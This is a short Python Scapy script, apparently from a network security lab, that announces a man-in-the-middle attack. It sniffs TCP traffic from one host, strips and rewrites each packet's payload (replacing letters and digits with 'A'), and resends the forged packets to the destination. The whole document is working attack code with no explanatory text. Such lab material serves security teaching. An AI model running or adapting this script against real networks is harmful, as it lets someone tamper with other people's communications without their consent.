#!/usr/bin/env python3
from scapy.all import *
IP_A = "10.9.0.5"
IP_B = "192.168.60.5"
IP_M = "10.9.0.111"

print("LAUNCHING MITM ATTACK.........")

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B: 
         newpkt = IP(bytes(pkt[IP]))
         del(newpkt.chksum)
         del(newpkt[TCP].payload)
         del(newpkt[TCP].chksum)

         if pkt[TCP].payload:
             data = pkt[TCP].payload.load
             print("*** %s, length: %d" % (data, len(data)))

             newdata = re.sub(r'[0-9a-zA-Z]', r'A', data.decode())

             send(newpkt/newdata)
         else: 
             send(newpkt)

filter_template = 'tcp and src {A}'
f = filter_template.format(A=IP_A)
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)

